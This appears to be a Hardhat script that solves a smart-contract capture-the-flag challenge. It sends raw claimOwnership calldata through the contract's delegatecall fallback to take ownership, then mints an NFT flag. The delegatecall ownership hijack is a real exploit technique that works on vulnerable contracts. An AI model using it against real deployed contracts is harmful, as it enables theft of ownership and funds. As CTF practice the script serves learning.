import * as dotenv from "dotenv";
dotenv.config();
import { ethers } from "hardhat";

async function main() {
  console.log("🎯 Solving Challenge 7: Ownership Claim");

  // Get the deployer account
  const [deployer] = await ethers.getSigners();
  console.log("👤 Using address:", deployer.address);

  // Get the Challenge7 contract address
  const challenge7Address = "0x2279B7A0a67DB372996a5FaB50D91eAA73d2eBe6";
  console.log("📋 Challenge7 contract address:", challenge7Address);

  const challenge7Abi = [
    "function mintFlag() public"
  ];
  const challenge7 = new ethers.Contract(challenge7Address, challenge7Abi, deployer);

  try {
    // Call claimOwnership through delegatecall (using fallback function)
    const iface = new ethers.Interface(["function claimOwnership()"]);
    const claimOwnershipData = iface.encodeFunctionData("claimOwnership");
    const claimTx = await deployer.sendTransaction({
      to: challenge7Address,
      data: claimOwnershipData
    });
    await claimTx.wait();
    console.log("✅ Ownership claimed!");

    // Now mint the flag
    console.log("🚩 Minting flag...");
    const mintTx = await challenge7.mintFlag();
    await mintTx.wait();
    console.log("🚩 Challenge 7 completed! You should now have an NFT flag.");

  } catch (error) {
    console.error("❌ Error solving challenge:", error);
  }
}

main().catch(error => {
  console.error(error);
  process.exitCode = 1;
}); 